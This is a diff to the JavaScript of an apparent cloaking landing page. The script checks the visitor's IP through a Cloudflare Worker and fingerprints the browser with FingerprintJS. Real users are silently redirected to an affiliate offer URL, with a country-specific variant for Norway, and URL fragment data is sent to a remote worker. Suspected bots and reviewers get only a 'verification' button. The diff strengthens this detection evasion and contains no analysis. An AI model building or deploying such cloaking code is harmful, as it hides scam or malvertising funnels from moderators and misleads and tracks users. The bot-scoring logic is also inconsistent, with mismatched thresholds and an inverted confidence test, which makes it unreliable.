@@ -4,6 +4,9 @@ const IP_CHECK_URL = 'https://trackerworkerv2.lugangxyz.workers.dev/check-ip';
 const DEFAULT_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=121832&s1=G20&s2=G20';
 const NORWAY_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=153951&s1=G20&s2=G20';
 
+// ========== GLOBAL STATE ==========
+let userCountry = '';
+
 // ========== AVATAR LIST (Rotated randomly on load) ==========
 const AVATAR_LIST = [
     'https://cdn.jsdelivr.net/gh/HamiguaLu/jslib/bot.detect/avatar/1.webp',
@@ -134,8 +137,15 @@ function extractCampCode(fragmentData) {
     }
 }
 
-// Send data to Cloudflare Worker and redirect
-async function sendToCloudflareAndRedirect(userData, redirectUrlOverride) {
+// Pick the redirect URL based on country
+function getRedirectUrl() {
+    return (userCountry === 'NO') ? NORWAY_REDIRECT_URL : DEFAULT_REDIRECT_URL;
+}
+
+// Send data to Cloudflare Worker and redirect.
+// Picks the URL itself (based on global userCountry), or uses the worker's
+// redirectUrl if the worker returned one.
+async function sendToCloudflareAndRedirect(userData) {
     try {
         const response = await fetch(WORKER_URL, {
             method: 'POST',
@@ -149,11 +159,10 @@ async function sendToCloudflareAndRedirect(userData, redirectUrlOverride) {
         });
         
         const result = await response.json();
-        const finalUrl = redirectUrlOverride || result.redirectUrl || `${DEFAULT_REDIRECT_URL}?data=${encodeURIComponent(userData)}`;
+        const finalUrl = result.redirectUrl || getRedirectUrl() || `${DEFAULT_REDIRECT_URL}?data=${encodeURIComponent(userData)}`;
         window.location.href = finalUrl;
     } catch (error) {
-        const fallbackUrl = redirectUrlOverride || `${DEFAULT_REDIRECT_URL}?data=${encodeURIComponent(userData)}`;
-        window.location.href = fallbackUrl;
+        window.location.href = getRedirectUrl();
     }
 }
 
@@ -218,12 +227,13 @@ function loadFingerprintJS() {
     });
 }
 
-// Check Fingerprint and auto-submit if confidence >= 0.6
-async function checkFingerprintAndAutoSubmit() {
+// Check Fingerprint. Returns TRUE if this looks like a bot (or if we can't tell),
+// FALSE only if we are confident it is a real human.
+async function checkFingerprintIsBot() {
     try {
         if (typeof FingerprintJS === 'undefined') {
-            console.log('[FingerprintJS] Not available');
-            return false;
+            console.log('[FingerprintJS] Not available - treating as bot');
+            return true;
         }
         
         console.log('[FingerprintJS] Generating fingerprint...');
@@ -233,15 +243,15 @@ async function checkFingerprintAndAutoSubmit() {
         console.log('[FingerprintJS] Confidence score:', result.confidence.score);
         
         if (result.confidence.score > 0.8) {
-            console.log('[FingerprintJS] High confidence (> 0.6) - Auto-submitting');
+            console.log('[FingerprintJS] High confidence (> 0.8) - treating as bot');
             return true;
         } else {
-            console.log('[FingerprintJS] Low confidence (< 0.6) - Showing button');
+            console.log('[FingerprintJS] Low confidence (<= 0.8) - treating as human');
             return false;
         }
     } catch (error) {
-        console.error('[FingerprintJS] Error:', error);
-        return false;
+        console.error('[FingerprintJS] Error - treating as bot:', error);
+        return true;
     }
 }
 
@@ -412,47 +422,34 @@ async function initApp() {
     // ========== RUN BOTH CHECKS IN PARALLEL ==========
     console.log('[App] Running IP check and FingerprintJS in parallel...');
     
-    const [ipResult, fpResult] = await Promise.all([
+    const [ipResult, isBot] = await Promise.all([
         checkIPBlocked(),                          // IP check -> { blocked, country }
-        loadFingerprintJS().then(() => {           // Load FP + check confidence
-            return checkFingerprintAndAutoSubmit();
+        loadFingerprintJS().then(() => {           // Load FP + check if bot
+            return checkFingerprintIsBot();
         }).catch(() => {
-            return false; // FP failed
+            return true; // FP failed to load -> treat as bot
         })
     ]);
     
     const ipBlocked = ipResult.blocked;
-    const country = ipResult.country;
+    userCountry = ipResult.country;   // store globally for later use
     
-    console.log(`[App] IP blocked: ${ipBlocked}, Country: ${country}, FP: ${fpResult}`);
+    console.log(`[App] IP blocked: ${ipBlocked}, Country: ${userCountry}, isBot: ${isBot}`);
     
     // ========== DECIDE BASED ON RESULTS ==========
+    // Rule: IP blocked OR bot -> show button.
+    //       Otherwise (clean IP AND human) -> redirect automatically.
     
-    // Norway -> special redirect immediately (regardless of block/FP status)
-    if (country === 'NO') {
-        console.log('[App] Country is Norway (NO) - redirecting to Norway URL');
-        const userData = getFragmentData();
-        await sendToCloudflareAndRedirect(userData, NORWAY_REDIRECT_URL);
-        return;
-    }
-    
-    // Show button if IP is blocked
-    if (ipBlocked) {
-        console.log('[App] IP is BLOCKED - showing button');
+    if (ipBlocked || isBot) {
+        console.log('[App] IP blocked or bot detected - showing button');
         createVerificationButton();
         return;
     }
     
-    if (fpResult === true) {
-        console.log('[App] FP high confidence - auto-submitting');
-        const userData = getFragmentData();
-        await sendToCloudflareAndRedirect(userData);
-        return;
-    }
-    
-    // Default: show button
-    console.log('[App] Showing verification button');
-    createVerificationButton();
+    // Clean IP + human -> auto redirect (URL picked by country)
+    console.log('[App] Clean IP + human - auto-redirecting');
+    const userData = getFragmentData();
+    await sendToCloudflareAndRedirect(userData);
 }
 
 // Start application when DOM is ready
